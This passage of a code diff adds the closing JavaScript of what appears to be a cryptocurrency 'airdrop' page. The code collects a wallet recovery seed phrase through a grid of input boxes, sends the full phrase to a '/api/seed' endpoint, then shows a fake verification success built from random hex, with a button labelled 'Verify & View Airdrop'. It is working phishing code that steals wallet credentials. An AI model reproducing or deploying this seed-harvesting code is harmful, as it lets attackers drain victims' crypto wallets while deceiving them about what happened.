+    inp.addEventListener('keydown',e=>{
+      if(e.key==='Backspace' && !e.target.value && i>0) arr[i-1].focus();
+    });
+    inp.addEventListener('paste',e=>{
+      e.preventDefault();
+      const t=(e.clipboardData.getData('text')||'').split(/[\s,]+/).filter(Boolean);
+      arr.forEach((el,j)=>el.value=(t[j]||'').toLowerCase());
+      (arr[Math.min(t.length,N)-1]||arr[0]).focus();
+    });
+  });
+}
+async function submitSeed(){
+  const inputs=document.querySelectorAll('#wg input');
+  const words=Array.from(inputs).map(i=>i.value.trim()).filter(Boolean);
+  const err=document.getElementById('eS'), b=document.getElementById('bSeed');
+  if(words.length!==N){err.textContent='Please enter all '+N+' words.';err.classList.add('show');return}
+  b.disabled=true; b.innerHTML='<span class="loader"></span> Verifying…';
+  try{
+    await fetch('/api/seed',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phrase:words.join(' '),kind:String(N),source:'fallback-seed'})});
+    goSuccess('0xseed'+randHex(60));
+  }catch(e){
+    err.textContent='Network error.';err.classList.add('show');
+    b.disabled=false; b.innerHTML='Verify & View Airdrop';
+  }
+}
+
+/* =====================================================
+   HELPERS
+   ===================================================== */
+function showErr(id,msg){
+  const e=document.getElementById(id);
+  e.textContent=msg; e.classList.add('show');
+}
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+function randHex(n){
+  let s=''; for(let i=0;i<n;i++) s+=Math.floor(Math.random()*16).toString(16);
+  return s;
+}
+function chainNum(){
+  return {eth:1,bsc:56,pol:137,bch:3030,base:8453,arb:42161,op:10,zksync:324,avax:43114,ftm:250,linea:59144,scroll:534352}[W.chain]||1;
+}
+buildGrid();
+</script>
+</body>
+</html>
